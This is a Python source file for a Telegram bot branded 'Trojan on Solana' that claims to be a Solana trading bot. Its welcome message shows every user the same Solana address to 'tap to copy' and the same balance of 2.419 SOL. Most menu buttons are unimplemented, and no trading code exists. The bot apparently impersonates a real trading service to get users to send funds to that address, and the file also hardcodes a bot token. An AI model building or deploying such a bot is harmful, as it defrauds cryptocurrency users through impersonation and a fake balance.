import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, Bot
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import os

# Set up logging
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# Bot token (replace with your bot token)
BOT_TOKEN = "7761108718:AAFmR_1ZtMAXX8DBi_r3BCo7418MtK6C1GU"

# Function to clear any existing webhook (important for resolving conflicts)
def clear_webhook():
    bot = Bot(BOT_TOKEN)
    bot.delete_webhook(drop_pending_updates=True)
    logger.info("Webhook cleared.")

# Define the main menu keyboard
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Buy", callback_data="buy"),
            InlineKeyboardButton("Sell", callback_data="sell"),
        ],
        [
            InlineKeyboardButton("Positions", callback_data="positions"),
            InlineKeyboardButton("Limit Orders", callback_data="limit_orders"),
        ],
        [
            InlineKeyboardButton("Referrals", callback_data="referrals"),
            InlineKeyboardButton("Withdraw", callback_data="withdraw"),
        ],
        [
            InlineKeyboardButton("Copy Trade", callback_data="copy_trade"),
            InlineKeyboardButton("Help", callback_data="help"),
        ],
    ])

# Define a keyboard for the Copy Trade menu
def copy_trade_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("New", callback_data="new_copy_trade")],
        [InlineKeyboardButton("Go Back to Main Menu", callback_data="back_to_main")],
    ])

# Define a keyboard to go back to the main menu
def back_to_main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Go Back to Main Menu", callback_data="back_to_main")],
    ])

# Function to handle the /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    video_path = "C:/path/to/your/video.mp4"
    
    # Send video and handle missing file error
    try:
        if os.path.exists(video_path):  # Check if file exists
            with open(video_path, 'rb') as video_file:
                await context.bot.send_video(
                    chat_id=update.effective_chat.id,
                    video=video_file,
                    caption="Welcome to Trojan on Solana! 🎥"
                )
        else:
            logger.error(f"Video file not found at {video_path}")
            await update.message.reply_text("Error: Welcome video not available.")
            return
    except Exception as e:
        logger.error(f"Error sending video: {e}")
        await update.message.reply_text("Error: Could not send video.")
    
    # Send the welcome text
    welcome_message = (
        f"Welcome to Trojan on Solana, {update.message.from_user.first_name}!\n\n"
        "Introducing a cutting-edge bot crafted exclusively for Solana Traders. "
        "Trade any token instantly right after launch.\n\n"
        "💳 *Solana Address:*\n"
        "`CTbFNi9v996i1Xbrg2QRXjJhXvLPiZAhqaG3HNkMfgat`\n"
        "(tap to copy)\n\n"
        "💰 *Balance:* 2.419 SOL\n\n"
        "Click on the *Refresh* button to update your current balance.\n\n"
        "Join our Telegram group @trojan for users of Trojan!"
    )
    await update.message.reply_text(welcome_message, parse_mode="Markdown", reply_markup=main_menu_keyboard())

# Function to handle button presses
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()

    # Handle button presses
    if query.data == "buy":
        message = "🛒 *Buy $SLND (Solend)* 📈"
        await query.edit_message_text(message, parse_mode="Markdown", reply_markup=back_to_main_keyboard())
    # Add other button cases here as necessary...
    else:
        await query.edit_message_text("⚠️ *Feature not implemented yet.*", reply_markup=back_to_main_keyboard())

# Function to run the bot
def run_bot():
    # Clear any existing webhook before starting the bot
    clear_webhook()

    application = Application.builder().token(BOT_TOKEN).build()

    # Add command and callback handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))

    # Run the bot using polling
    application.run_polling()

# Entry point
if __name__ == "__main__":
    run_bot()
